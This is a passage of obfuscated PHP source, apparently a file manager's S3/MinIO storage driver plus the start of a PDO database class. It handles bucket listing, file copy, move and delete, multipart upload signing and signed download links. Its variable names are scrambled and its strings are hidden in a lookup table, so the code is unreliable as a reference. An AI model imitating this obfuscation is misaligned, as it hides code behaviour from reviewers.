$‡ıÙ—Ó; $this->client->setSignatureVersion($‡ıÙ—Ó); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $­¥­çÅÏ =& $_SERVER[Ù×¯Ø…]; $ã€Óï³è = $this->getBucketCors(); if (!$ã€Óï³è || !is_array($ã€Óï³è)) { return !1; } if ($ã€Óï³è[$­¥­çÅÏ[181]] != $­¥­çÅÏ[182] || $ã€Óï³è[$­¥­çÅÏ[183]] != $­¥­çÅÏ[182]) { return !1; } $ååºŒ·’ = array_map($­¥­çÅÏ[184], $ã€Óï³è[$­¥­çÅÏ[185]]); if (!is_array($ååºŒ·’)) { $ååºŒ·’ = array(); } $Ï¤´úûú = array($­¥­çÅÏ[186], $­¥­çÅÏ[187], $­¥­çÅÏ[188], $­¥­çÅÏ[189], $­¥­çÅÏ[190]); $‰áŠã¢ç = array_diff($Ï¤´úûú, $ååºŒ·’); return empty($‰áŠã¢ç); } public function mkfile($·ÁÒØáÚ, $¬ª×ô‡ß = '', $¸´üõğÛ = REPEAT_RENAME) { $ĞäÍåîŞ = $this->setContent($·ÁÒØáÚ, $¬ª×ô‡ß); if ($ĞäÍåîŞ !== !1) { return $this->getPathOuter($·ÁÒØáÚ); } return !1; } public function mkdir($ß•ş”Ã„, $ÕéåÍ = REPEAT_SKIP) { $¿Õ–’…› =& $_SERVER[Ù×¯Ø…]; if (empty($ß•ş”Ã„) && $ß•ş”Ã„ !== $¿Õ–’…›[191]) { return !1; } if ($this->_isFolder($ß•ş”Ã„)) { return $this->getPathOuter($ß•ş”Ã„); } $ğòé™Úá = $this->setContent($ß•ş”Ã„, $¿Õ–’…›[33], !0); if ($ğòé™Úá !== !1) { return $this->getPathOuter($ß•ş”Ã„); } return !1; } public function copyFile($€Šƒ°Û÷, $ğı¨Íõî, $ˆ§Ö²Ò = array()) { $†åûË«ä =& $_SERVER[Ù×¯Ø…]; $ÔÄÄç‹¡ = $this->objectMeta($€Šƒ°Û÷); if (!$ÔÄÄç‹¡) { return !1; } if ($ÔÄÄç‹¡[$†åûË«ä[78]] <= 1024 * 1024 * 200) { $¦îë‘‡× = $this->client->copyObject($this->bucket, $€Šƒ°Û÷, $this->bucket, $ğı¨Íõî, $†åûË«ä[192], $ˆ§Ö²Ò); } else { $¦îë‘‡× = $this->client->multiCopyObject($this->bucket, $€Šƒ°Û÷, $this->bucket, $ğı¨Íõî, $ˆ§Ö²Ò); } $¦îë‘‡× = $¦îë‘‡× ? $this->getPathOuter($ğı¨Íõî) : !1; return $¦îë‘‡×; } public function moveFile($İìğ‡, $ù…«¡©¹) { if ($this->copyFile($İìğ‡, $ù…«¡©¹)) { $this->delFile($İìğ‡); return $this->getPathOuter($ù…«¡©¹); } return !1; } public function delFile($ßÈ„†Ö) { return $this->client->deleteObject($this->bucket, $ßÈ„†Ö); } public function delFolder($²åÀïóÕ) { $Çê´©Ö =& $_SERVER[Ù×¯Ø…]; if (!$this->exist($²åÀïóÕ)) { return !0; } $this->listItemCache = !1; $ûĞ€û = $this->fileList($²åÀïóÕ); $this->listItemCache = !0; $âúÇ¯˜Ú = trim($²åÀïóÕ, $Çê´©Ö[8]) . $Çê´©Ö[8]; if (!empty($²åÀïóÕ) && $²åÀïóÕ !== $Çê´©Ö[191] && !in_array($âúÇ¯˜Ú, $ûĞ€û[$Çê´©Ö[75]])) { $ûĞ€û[$Çê´©Ö[75]][] = $âúÇ¯˜Ú; } $ÁîßŞÕ÷ = $this->delByBatch($ûĞ€û[$Çê´©Ö[74]]); if (!$ÁîßŞÕ÷) { return !1; } $ÁîßŞÕ÷ = $this->delByBatch($ûĞ€û[$Çê´©Ö[75]]); if (!$ÁîßŞÕ÷) { return !1; } return $this->delFile($âúÇ¯˜Ú); } private function delByBatch($ÆâÚÌşû) { foreach (array_chunk($ÆâÚÌşû, 1000) as $èşÌÓŞî) { $±¢‰Ã‘ò = $this->client->deleteObjects($this->bucket, $èşÌÓŞî); if (!$±¢‰Ã‘ò) { return !1; } } return !0; } public function rename($ıâÏ³ûÈ, $º¯ô¼–Ä) { return $this->renameObject($ıâÏ³ûÈ, $º¯ô¼–Ä); } public function listPath($Ã€‘Çâí, $ÏÑ‡ù¹“ = false) { $Ó›å—ŸÍ =& $_SERVER[Ù×¯Ø…]; $˜®¸µÄÁ = $this->fileList($Ã€‘Çâí, $Ó›å—ŸÍ[8], !0); foreach ($˜®¸µÄÁ[$Ó›å—ŸÍ[75]] as $Ë¶©Ûî† => $‰ë›ß§) { $˜®¸µÄÁ[$Ó›å—ŸÍ[75]][$Ë¶©Ûî†] = $this->folderInfo($‰ë›ß§, $ÏÑ‡ù¹“); } foreach ($˜®¸µÄÁ[$Ó›å—ŸÍ[74]] as $Ë¶©Ûî† => $‰ë›ß§) { $˜®¸µÄÁ[$Ó›å—ŸÍ[74]][$Ë¶©Ûî†] = $this->fileInfo($‰ë›ß§[$Ó›å—ŸÍ[28]], $ÏÑ‡ù¹“, $‰ë›ß§); } return $˜®¸µÄÁ; } private function fileInfo($±ŸÖÆİî, $ˆÍ¢”Æ = false, $½À´Ç™í = array()) { $Ğ¶Ìåœù =& $_SERVER[Ù×¯Ø…]; $Œ¹µôğ´ = array($Ğ¶Ìåœù[28] => $this->pathThis($±ŸÖÆİî), $Ğ¶Ìåœù[76] => $this->getPathOuter($±ŸÖÆİî), $Ğ¶Ìåœù[29] => $Ğ¶Ìåœù[193], $Ğ¶Ìåœù[168] => $this->ext($±ŸÖÆİî), $Ğ¶Ìåœù[78] => isset($½À´Ç™í[$Ğ¶Ìåœù[78]]) ? $½À´Ç™í[$Ğ¶Ìåœù[78]] : 0); if ($ˆÍ¢”Æ) { return $Œ¹µôğ´; } $Œ¹µôğ´[$Ğ¶Ìåœù[194]] = $Œ¹µôğ´[$Ğ¶Ìåœù[84]] = 0; $Œ¹µôğ´[$Ğ¶Ìåœù[195]] = $Œ¹µôğ´[$Ğ¶Ìåœù[196]] = !0; if (empty($½À´Ç™í)) { $½À´Ç™í = $this->objectMeta($±ŸÖÆİî); if (!$½À´Ç™í) { return $Œ¹µôğ´; } } if (isset($½À´Ç™í[$Ğ¶Ìåœù[197]])) { $Œ¹µôğ´[$Ğ¶Ìåœù[84]] = $½À´Ç™í[$Ğ¶Ìåœù[197]]; } if (isset($½À´Ç™í[$Ğ¶Ìåœù[78]])) { $Œ¹µôğ´[$Ğ¶Ìåœù[78]] = $½À´Ç™í[$Ğ¶Ìåœù[78]]; } return $Œ¹µôğ´; } private function folderInfo($Ô¥õòÅ­, $ä¢Ôş« = false) { $ğÃÖğ„ =& $_SERVER[Ù×¯Ø…]; $Š·àÜ÷„ = array($ğÃÖğ„[28] => $this->pathThis($Ô¥õòÅ­), $ğÃÖğ„[76] => $this->getPathOuter($ğÃÖğ„[8] . $Ô¥õòÅ­), $ğÃÖğ„[29] => $ğÃÖğ„[77]); if ($ä¢Ôş«) { return $Š·àÜ÷„; } $Š·àÜ÷„[$ğÃÖğ„[194]] = $Š·àÜ÷„[$ğÃÖğ„[84]] = 0; $Š·àÜ÷„[$ğÃÖğ„[195]] = $Š·àÜ÷„[$ğÃÖğ„[196]] = !0; if ($Ô¥õòÅ­ == $ğÃÖğ„[33]) { return $Š·àÜ÷„; } $Ô¥õòÅ­ = trim($Ô¥õòÅ­, $ğÃÖğ„[8]) . $ğÃÖğ„[8]; $ùÅÕÓé¾ = $this->objectMeta($Ô¥õòÅ­); if (isset($ùÅÕÓé¾[$ğÃÖğ„[197]])) { $Š·àÜ÷„[$ğÃÖğ„[194]] = $ùÅÕÓé¾[$ğÃÖğ„[197]]; } return $Š·àÜ÷„; } private function fileList($ÊŸÏ¤Îà, $ÅÆô£Û® = '', $ğšñ ¶Ö = 0) { $Ú‘ÛÆ =& $_SERVER[Ù×¯Ø…]; $şŞÆ¾ó = rtrim($ÊŸÏ¤Îà, $Ú‘ÛÆ[8]) . $Ú‘ÛÆ[8]; $íªá–‹ = $this->listObjs($şŞÆ¾ó, null, null, $ÅÆô£Û®); if (!$íªá–‹) { return array($Ú‘ÛÆ[75] => array(), $Ú‘ÛÆ[74] => array()); } $òÂÇ¹Ù“ = $this->listItemCache === !1 ? !1 : !0; $‰©»®Ù³ = $ÛËÅÜ‘ò = array(); foreach ($íªá–‹[$Ú‘ÛÆ[198]] as $Ù‡»ï•ª) { $İŒ‘Š·Ö = $Ù‡»ï•ª[$Ú‘ÛÆ[28]]; if ($İŒ‘Š·Ö == $şŞÆ¾ó) { continue; } $ıì÷¹ÓÈ = isset($Ù‡»ï•ª[$Ú‘ÛÆ[78]]) ? $Ù‡»ï•ª[$Ú‘ÛÆ[78]] : 0; $æì»¶áÕ = $ıì÷¹ÓÈ == 0 && substr($İŒ‘Š·Ö, strlen($İŒ‘Š·Ö) - 1, 1) == $Ú‘ÛÆ[8] ? !0 : !1; if ($òÂÇ¹Ù“) { $this->cacheMethod($Ú‘ÛÆ[199], $İŒ‘Š·Ö, $æì»¶áÕ); $this->cacheMethod($Ú‘ÛÆ[200], $İŒ‘Š·Ö, $Ù‡»ï•ª); } if ($æì»¶áÕ) { $‰©»®Ù³[] = $İŒ‘Š·Ö; continue; } $ÛËÅÜ‘ò[] = $ğšñ ¶Ö ? $Ù‡»ï•ª : $İŒ‘Š·Ö; } foreach ($íªá–‹[$Ú‘ÛÆ[201]] as $Ù‡»ï•ª) { $‰©»®Ù³[] = $Ù‡»ï•ª[$Ú‘ÛÆ[28]]; if ($òÂÇ¹Ù“) { $this->cacheMethod($Ú‘ÛÆ[199], $Ù‡»ï•ª[$Ú‘ÛÆ[28]], !0); } } if ($òÂÇ¹Ù“) { $this->cacheMethod($Ú‘ÛÆ[199], $ÊŸÏ¤Îà, !0); } return array($Ú‘ÛÆ[75] => $‰©»®Ù³, $Ú‘ÛÆ[74] => $ÛËÅÜ‘ò); } private function listObjs($ïâˆ‚Œß, $‚È£›×ƒ = null, $‹ÖØïäÚ = null, $»Ùº¯éÔ = null) { $æøË¹ËÈ =& $_SERVER[Ù×¯Ø…]; $ïâˆ‚Œß = trim($ïâˆ‚Œß, $æøË¹ËÈ[8]); $À×ì¹¶ = empty($ïâˆ‚Œß) && $ïâˆ‚Œß !== $æøË¹ËÈ[191] ? $æøË¹ËÈ[33] : $ïâˆ‚Œß . $æøË¹ËÈ[8]; return $this->client->getBucket($this->bucket, $À×ì¹¶, $‚È£›×ƒ, $‹ÖØïäÚ, $»Ùº¯éÔ, !0); } public function has($€Êçæû, $ÃìÀ‹ê = false, $í•ÈÒ ¨ = true) { $¿ãŒé½ =& $_SERVER[Ù×¯Ø…]; $€Êçæû = trim($€Êçæû, $¿ãŒé½[8]); $ù²ß÷‘Ì = empty($€Êçæû) && $€Êçæû !== $¿ãŒé½[191] ? $¿ãŒé½[33] : $€Êçæû . $¿ãŒé½[8]; $ÜØ±åº = null; $²Œ±÷–· = 500; $äŞŒĞ = $¿ãŒé½[8]; $è¾¹«Ô§ = $¦Ó”øÄµ = array(); while (!0) { $·ƒ®Ş÷ = $this->listObjs($€Êçæû, $ÜØ±åº, $²Œ±÷–·, $äŞŒĞ); if (!$·ƒ®Ş÷) { break; } $ÜØ±åº = $·ƒ®Ş÷[$¿ãŒé½[202]]; $˜íœõº‚ = $·ƒ®Ş÷[$¿ãŒé½[198]]; $ÖÚüµû™ = $·ƒ®Ş÷[$¿ãŒé½[201]]; if (empty($˜íœõº‚) && empty($ÖÚüµû™)) { break; } if (count($˜íœõº‚) == 1 && $˜íœõº‚[0][$¿ãŒé½[28]] == $ù²ß÷‘Ì) { break; } if ($ÃìÀ‹ê) { if (count($˜íœõº‚)) { $˜íœõº‚ = array_column($˜íœõº‚, $¿ãŒé½[28]); $è¾¹«Ô§ = array_merge($è¾¹«Ô§, $˜íœõº‚); } if (count($ÖÚüµû™)) { $ÖÚüµû™ = array_column($ÖÚüµû™, $¿ãŒé½[28]); $¦Ó”øÄµ = array_merge($¦Ó”øÄµ, $ÖÚüµû™); } if ($ÜØ±åº === null) { break; } continue; } if ($í•ÈÒ ¨) { if (!empty($˜íœõº‚)) { if (count($˜íœõº‚) > 1 || isset($˜íœõº‚[0][$¿ãŒé½[28]]) && $˜íœõº‚[0][$¿ãŒé½[28]] != $ù²ß÷‘Ì) { return !0; } } } else { if (!empty($ÖÚüµû™)) { return !0; } } if ($ÜØ±åº === null) { break; } } if ($ÃìÀ‹ê) { $è¾¹«Ô§ = array_diff($è¾¹«Ô§, array($ù²ß÷‘Ì)); $è¾¹«Ô§ = count(array_unique($è¾¹«Ô§)); $¦Ó”øÄµ = count(array_unique($¦Ó”øÄµ)); return array($¿ãŒé½[203] => $è¾¹«Ô§, $¿ãŒé½[204] => $¦Ó”øÄµ); } return !1; } public function listAll($ôØ¡Ğ«õ) { $ñ­ú¦˜ =& $_SERVER[Ù×¯Ø…]; $ıÀ˜îªß = $this->fileList($ôØ¡Ğ«õ, $ñ­ú¦˜[33], !0); $“í¾ˆ = array(); foreach ($ıÀ˜îªß[$ñ­ú¦˜[74]] as $ï²’òñ) { $“í¾ˆ[$ï²’òñ[$ñ­ú¦˜[28]]] = $ï²’òñ[$ñ­ú¦˜[78]]; } foreach ($ıÀ˜îªß[$ñ­ú¦˜[75]] as $ï²’òñ) { if (is_string($ï²’òñ)) { $“í¾ˆ[$ï²’òñ] = 0; } } return $this->listAllFiles($ôØ¡Ğ«õ, array_keys($“í¾ˆ), $“í¾ˆ); } public function canRead($ÌåİË) { $ÌŠÒ¦Ç =& $_SERVER[Ù×¯Ø…]; $¿ˆ†Ï = $this->client->getAccessControlPolicy($this->bucket, $ÌåİË); if (!$¿ˆ†Ï) { return !1; } return in_array($¿ˆ†Ï, array($ÌŠÒ¦Ç[205], $ÌŠÒ¦Ç[206], $ÌŠÒ¦Ç[207])) ? !0 : !1; } public function canWrite($‡´Ããï¡) { $„áôºº =& $_SERVER[Ù×¯Ø…]; $«ˆê¡í = $this->client->getAccessControlPolicy($this->bucket, $‡´Ããï¡); if (!$«ˆê¡í) { return !1; } return in_array($«ˆê¡í, array($„áôºº[205], $„áôºº[206])) ? !0 : !1; } public function getContent($ÄÕÎ°«Ù) { return $this->client->getObject($this->bucket, $ÄÕÎ°«Ù); } public function setContent($¥ĞÖ¤ä€, $€ùûĞ¥¶ = '', $Õ»õÂÆ = false) { $¡ŸÏ’Âö =& $_SERVER[Ù×¯Ø…]; $¥ĞÖ¤ä€ = $Õ»õÂÆ ? trim($¥ĞÖ¤ä€, $¡ŸÏ’Âö[8]) . $¡ŸÏ’Âö[8] : $¥ĞÖ¤ä€; $êÚ± ÑÂ = get_file_mime(get_path_ext($¥ĞÖ¤ä€)); $ß’Õ¹÷± = $this->client->putObject($€ùûĞ¥¶, $this->bucket, $¥ĞÖ¤ä€, $¡ŸÏ’Âö[192], array(), $êÚ± ÑÂ); if (!$ß’Õ¹÷±) { return !1; } if ($Õ»õÂÆ) { return !0; } $this->cacheMethod(null, null); $ß’Õ¹÷± = $this->copyFile($¥ĞÖ¤ä€, $¥ĞÖ¤ä€, array($¡ŸÏ’Âö[208] => $ß’Õ¹÷±[$¡ŸÏ’Âö[209]])); return $ß’Õ¹÷± ? !0 : !1; } public function fileSubstr($ÀË¦ˆ®, $Ï“ñÎÄµ, $ã‡·šÌë) { $Ã®æ¡™Â = $Ï“ñÎÄµ + $ã‡·šÌë - 1; return $this->client->getObject($this->bucket, $ÀË¦ˆ®, array($_SERVER[Ù×¯Ø…][210] => "\x62\x79\164\145\163\75{$Ï“ñÎÄµ}\55{$Ã®æ¡™Â}")); } public function upload($æç“¡°ü, $«ß¾úÑ×, $™ø„ = false, $æıÜ°£ˆ = REPEAT_REPLACE) { $äí’ãÇ =& $_SERVER[Ù×¯Ø…]; $¦Ù±ñ³Ô = array($äí’ãÇ[208] => @md5_file($«ß¾úÑ×)); $Ÿòæ¾Ãı = array($äí’ãÇ[211] => get_file_mime(get_path_ext($æç“¡°ü))); if (IO::size($«ß¾úÑ×) <= 1024 * 1024 * 200) { $ò³“ó…ı = $this->client->putObjectFile($«ß¾úÑ×, $this->bucket, $æç“¡°ü, $äí’ãÇ[192], $¦Ù±ñ³Ô, $Ÿòæ¾Ãı); return !empty($ò³“ó…ı) ? $this->getPathOuter($æç“¡°ü) : !1; } $˜³ŸúŒÂ = $this->client->multiUploadObject($«ß¾úÑ×, $this->bucket, trim($æç“¡°ü, $äí’ãÇ[8]), $¦Ù±ñ³Ô, $Ÿòæ¾Ãı); return $˜³ŸúŒÂ ? $this->getPathOuter($æç“¡°ü) : !1; } public function download($ßÙÓÛ¡‹, $½¨¤ù„é) { if (!@is_dir($this->pathFather($½¨¤ù„é)) && !IO::mkdir($this->pathFather($½¨¤ù„é))) { return !1; } $‹ìïÃó = $this->client->getObject($this->bucket, $ßÙÓÛ¡‹, array(), $½¨¤ù„é); return $‹ìïÃó !== !1 ? $½¨¤ù„é : !1; } public function link($­øúŸ°Û, $©¯×êœ = array()) { $†–›Ô =& $_SERVER[Ù×¯Ø…]; if ($this->signVer == $†–›Ô[212]) { return $this->client->getAuthenticatedURL($this->bucket, $­øúŸ°Û, 3600 * 12, $©¯×êœ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($­øúŸ°Û, $†–›Ô[8]), 3600 * 12, $this->region, array(), !0, $©¯×êœ); } public function fileOut($›¿ÒÓª†, $Û ×Ÿé¡ = false, $§ÚÕè›Ø = false, $ ãÎ§ÊÕ = '') { $‚ƒ™ÕÁ =& $_SERVER[Ù×¯Ø…]; if ($this->isFileOutServer()) { return $this->fileOutServer($›¿ÒÓª†, $Û ×Ÿé¡, $§ÚÕè›Ø, $ ãÎ§ÊÕ); } if (!$§ÚÕè›Ø) { $§ÚÕè›Ø = $this->pathThis($›¿ÒÓª†); } $ÖèÏŸß× = get_file_mime(get_path_ext($§ÚÕè›Ø)); if ($ÖèÏŸß× == $‚ƒ™ÕÁ[213]) { return parent::fileOut($›¿ÒÓª†, $Û ×Ÿé¡, $§ÚÕè›Ø, $ ãÎ§ÊÕ); } $Û ×Ÿé¡ = $Û ×Ÿé¡ ? $‚ƒ™ÕÁ[214] : $‚ƒ™ÕÁ[215]; $Ñ¸ˆº¢Ã = array($‚ƒ™ÕÁ[216] => $Û ×Ÿé¡ . $‚ƒ™ÕÁ[217] . rawurlencode($§ÚÕè›Ø), $‚ƒ™ÕÁ[218] => $ÖèÏŸß×); $Ø–Ã† ¾ = $this->link($›¿ÒÓª†, $Ñ¸ˆº¢Ã); $this->fileOutLink($Ø–Ã† ¾); } public function fileOutServer($³ñ¹Ûğ±, $“Ú«½– = false, $É©“åàî = false, $‘ÄÏş²ô = '') { parent::fileOut($³ñ¹Ûğ±, $“Ú«½–, $É©“åàî, $‘ÄÏş²ô); } public function fileOutImageServer($«£ğ“¬¸, $ô£ƒñ½› = 250) { parent::fileOutImage($«£ğ“¬¸, $ô£ƒñ½›); } public function hashMd5($¦Ó‡†‡, $üÃèš¤Ñ = '') { $ÕëŠ¿´Ş =& $_SERVER[Ù×¯Ø…]; $’ıïÁ°Ä = $this->objectMeta($¦Ó‡†‡); if (!$’ıïÁ°Ä) { return !1; } $üÃèš¤Ñ = $üÃèš¤Ñ ? $üÃèš¤Ñ : _get($’ıïÁ°Ä, $ÕëŠ¿´Ş[219]); $üÃèš¤Ñ = $üÃèš¤Ñ ? $üÃèš¤Ñ : _get($’ıïÁ°Ä, $ÕëŠ¿´Ş[209], $ÕëŠ¿´Ş[33]); return $üÃèš¤Ñ; } public function uploadFormData($Î’¹ˆÃ², $‘è°ÚÏË = 3600) { $ıÇ«ü‚¨ =& $_SERVER[Ù×¯Ø…]; $š­Ô“ÙÅ = $this->pathFather($Î’¹ˆÃ²); $×áË‹Åş = $this->client->getHttpUploadPostParams($this->bucket, $š­Ô“ÙÅ, $ıÇ«ü‚¨[192], $‘è°ÚÏË); return array_merge((array) $×áË‹Åş, array($ıÇ«ü‚¨[175] => $this->getHost())); } public function multiUploadFormData($ìùÃÀé, $Œ»ñ½Äª = 3600) { $§ş¨»‡ã =& $_SERVER[Ù×¯Ø…]; $Ç±®Š¯“ = gmdate($§ş¨»‡ã[220]); $‘™è£© = array(); $Ø¯…Òñ¨ = $this->client->getUploadId($this->bucket, $ìùÃÀé, $‘™è£©); if (!$Ø¯…Òñ¨) { return !1; } return array($§ş¨»‡ã[221] => $Ø¯…Òñ¨, $§ş¨»‡ã[175] => $this->getHost() . $§ş¨»‡ã[8] . $this->pathEncode($ìùÃÀé), $§ş¨»‡ã[222] => $Ç±®Š¯“, $§ş¨»‡ã[93] => $ìùÃÀé); } public function multiUploadAuthData($¯Ü¡¼‘, $è¹Öí¶­ = array()) { $ıçÜèõ× =& $_SERVER[Ù×¯Ø…]; $ò¬óüº = isset($è¹Öí¶­[$ıçÜèõ×[222]]) ? $è¹Öí¶­[$ıçÜèõ×[222]] : gmdate($ıçÜèõ×[220]); $íôûï¼ş = isset($è¹Öí¶­[$ıçÜèõ×[168]]) ? $è¹Öí¶­[$ıçÜèõ×[168]] : $ıçÜèõ×[33]; $ñ’¢Î¡æ = $è¹Öí¶­[$ıçÜèõ×[93]]; unset($è¹Öí¶­[$ıçÜèõ×[93]]); if (isset($è¹Öí¶­[$ıçÜèõ×[223]])) { $è¹Öí¶­[$ıçÜèõ×[222]] = $ò¬óüº; return $this->listUploadParts($ñ’¢Î¡æ, $è¹Öí¶­); } $ˆ³ÉÉ¿ = array($ıçÜèõ×[224], $ıçÜèõ×[33], $ıçÜèõ×[119], $ıçÜèõ×[33], "\x78\55\141\x6d\x7a\x2d\144\x61\x74\x65\x3a{$ò¬óüº}", $ıçÜèõ×[8] . $this->bucket . $ıçÜèõ×[8] . $this->pathEncode($ñ’¢Î¡æ) . $íôûï¼ş); if (strpos($íôûï¼ş, $ıçÜèõ×[225]) === 0) { $ˆ³ÉÉ¿[0] = $ıçÜèõ×[226]; } if (isset($è¹Öí¶­[$ıçÜèõ×[227]]) && $è¹Öí¶­[$ıçÜèõ×[227]] == $ıçÜèõ×[228]) { $ˆ³ÉÉ¿[0] = $ıçÜèõ×[228]; } $õÚ‹éÜñ = implode($ıçÜèõ×[229], $ˆ³ÉÉ¿); $àá´ôğœ = base64_encode(hash_hmac($ıçÜèõ×[230], $õÚ‹éÜñ, $this->secret, !0)); $ÜçÖğŞœ = $ıçÜèõ×[231] . $this->accessKey . $ıçÜèõ×[4] . $àá´ôğœ; if (strpos($íôûï¼ş, $ıçÜèõ×[225]) === 0) { return array($ıçÜèõ×[232] => $ÜçÖğŞœ, $ıçÜèõ×[222] => $ò¬óüº); } return $ÜçÖğŞœ; } public function listUploadParts($òï¬«ÈŞ, $çßñã°¼ = array()) { $µêå­Ùï =& $_SERVER[Ù×¯Ø…]; $—œöıµÚ = str_replace($µêå­Ùï[233], $µêå­Ùï[33], $çßñã°¼[$µêå­Ùï[168]]); $ûÄ†Íá¹ = $this->client->listParts($this->bucket, $òï¬«ÈŞ, $—œöıµÚ); if (!$ûÄ†Íá¹) { return !1; } unset($çßñã°¼[$µêå­Ùï[223]], $çßñã°¼[$µêå­Ùï[227]]); $çßñã°¼[$µêå­Ùï[93]] = $òï¬«ÈŞ; $¯¬µå¶ = $this->multiUploadAuthData($òï¬«ÈŞ, $çßñã°¼); if (empty($¯¬µå¶)) { return !1; } return array($µêå­Ùï[232] => $¯¬µå¶, $µêå­Ùï[222] => $çßñã°¼[$µêå­Ùï[222]], $µêå­Ùï[234] => $ûÄ†Íá¹); } public function getHost() { return parent::getHost() . $_SERVER[Ù×¯Ø…][8] . $this->bucket; } public function size($—–Êº£Ê) { $¥®½Ğàé = $this->objectMeta($—–Êº£Ê); return $¥®½Ğàé ? $¥®½Ğàé[$_SERVER[Ù×¯Ø…][78]] : 0; } public function info($£¿ûÌ±’) { if ($this->isFolder($£¿ûÌ±’)) { return $this->folderInfo($£¿ûÌ±’); } else { if ($this->isFile($£¿ûÌ±’)) { return $this->fileInfo($£¿ûÌ±’); } } return !1; } public function exist($ÎàÍ±ò¡) { return $this->isFile($ÎàÍ±ò¡) || $this->isFolder($ÎàÍ±ò¡); } public function isFile($Şæ©ÃÃÀ) { return !$this->isFolder($Şæ©ÃÃÀ) && $this->objectMeta($Şæ©ÃÃÀ); } public function isFolder($Ÿ‚Àà’) { return $this->cacheMethod($_SERVER[Ù×¯Ø…][199], $Ÿ‚Àà’); } protected function objectMeta($‘„ï†–) { return $this->cacheMethod($_SERVER[Ù×¯Ø…][200], $‘„ï†–); } protected function _objectMeta($÷¹â£®Æ) { $Éè°ßÊÉ =& $_SERVER[Ù×¯Ø…]; $÷¹â£®Æ = rtrim($÷¹â£®Æ, $Éè°ßÊÉ[8]); try { $Ñòû¶’‘ = $this->client->getObjectInfo($this->bucket, $÷¹â£®Æ); if (!isset($Ñòû¶’‘[$Éè°ßÊÉ[219]]) && isset($Ñòû¶’‘[$Éè°ßÊÉ[235]])) { $Ñòû¶’‘[$Éè°ßÊÉ[219]] = $Ñòû¶’‘[$Éè°ßÊÉ[235]]; } } catch (Exception $œû£„Ğ‰) { $Ñòû¶’‘ = !1; } if (!$Ñòû¶’‘) { } return $Ñòû¶’‘; } protected function _isFolder($àÅìœµŸ) { $«É³ ¾é =& $_SERVER[Ù×¯Ø…]; $àÅìœµŸ = rtrim($àÅìœµŸ, $«É³ ¾é[8]); if ($àÅìœµŸ == $«É³ ¾é[33] || $àÅìœµŸ == $«É³ ¾é[8]) { return !0; } $Â£ı¨È = $this->client->getBucket($this->bucket, $àÅìœµŸ, null, 1); if (empty($Â£ı¨È[$«É³ ¾é[198]])) { return !1; } $ûõÔ‚« = $Â£ı¨È[$«É³ ¾é[198]][0][$«É³ ¾é[28]]; return stripos($ûõÔ‚«, $àÅìœµŸ . $«É³ ¾é[8]) === 0 ? !0 : !1; if (substr($ûõÔ‚«, -1) == $«É³ ¾é[8]) { return !0; } if (get_path_this($ûõÔ‚«) == get_path_this($àÅìœµŸ)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($­«å¼‡ù) { parent::__construct($­«å¼‡ù); $this->signatureVersion($_SERVER[Ù×¯Ø…][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto C¢‡¼ÂöÎÄ; a¿øåâŒ˜å: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Î‚Õî‹µ = '') { $’òŒĞ† =& $_SERVER[Ù×¯Ø…]; if (!class_exists($’òŒĞ†[912])) { think_exception(think_lang($’òŒĞ†[10]) . $’òŒĞ†[913]); } if (!empty($Î‚Õî‹µ)) { $this->config = $Î‚Õî‹µ; if (empty($this->config[$’òŒĞ†[13]])) { $this->config[$’òŒĞ†[13]] = array(); } } } public function connect($èÕ„ø¾È = '', $ƒà¶ò³ = 0) { $úÒÁ±­õ =& $_SERVER[Ù×¯Ø…]; if (!isset($this->linkID[$ƒà¶ò³])) { if (empty($èÕ„ø¾È)) { $èÕ„ø¾È = $this->config; } $ÓÈ¥¨äá = !empty($èÕ„ø¾È[$úÒÁ±­õ[13]][$úÒÁ±­õ[14]]) ? $èÕ„ø¾È[$úÒÁ±­õ[13]][$úÒÁ±­õ[14]] : $this->pconnect; if ($ÓÈ¥¨äá) { $èÕ„ø¾È[$úÒÁ±­õ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ƒà¶ò³] = new PDO($èÕ„ø¾È[$úÒÁ±­õ[914]], $èÕ„ø¾È[$úÒÁ±­õ[887]], $èÕ„ø¾È[$úÒÁ±­õ[888]], $èÕ„ø¾È[$úÒÁ±­õ[13]]); } catch (PDOException $ÜÍããß›) { think_exception($ÜÍããß›->getMessage()); } $this->dbType = $this->_getDsnType($èÕ„ø¾È[$úÒÁ±­õ[914]]); if (in_array($this->dbType, array($úÒÁ±­õ[915], $úÒÁ±­õ[916], $úÒÁ±­õ[917], $úÒÁ±­õ[918]))) { think_exception($úÒÁ±­õ[919] . $this->dbType . $úÒÁ±­õ[920] . $this->dbType . $úÒÁ±­õ[921]); } if (!$this->linkID[$ƒà¶ò³]) { think_exception($úÒÁ±­õ[922]); } try { $this->linkID[$ƒà¶ò³]->exec($úÒÁ±­õ[923] . think_config($úÒÁ±­õ[890])); } catch (Exception $ÜÍããß›) { } $this->connected = !0; if (1 != think_config($úÒÁ±­õ[18])) { unset($this->config); } } return $this->linkID[$ƒà¶ò³]; } public function free() { $this->PDOStatement = null; } public function query($˜úå€İ¸, $£¢àÃ¤ = array()) { $™Ì£µ§© =& $_SERVER[Ù×¯Ø…]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $˜úå€İ¸; if (!empty($£¢àÃ¤)) { $this->queryStr .= $™Ì£µ§©[924] . print_r($£¢àÃ¤, !0) . $™Ì£µ§©[925]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($™Ì£µ§©[19], 1); think_status($™Ì£µ§©[20]); $this->PDOStatement = $this->_linkID->prepare($˜úå€İ¸); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $íè…şüÕ = $this->PDOStatement->execute($£¢àÃ¤); $this->debug(); if (!1 === $íè…şüÕ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÕèÌ¹âÙ, $Ø¼üèóá = array()) { $ïÛÖÓŠÏ =& $_SERVER[Ù×¯Ø…]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÕèÌ¹âÙ; if (!empty($Ø¼üèóá)) { $this->queryStr .= $ïÛÖÓŠÏ[924] . print_r($Ø¼üèóá, !0) . $ïÛÖÓŠÏ[925]; } $ñ˜²¾ƒÜ = !1; if 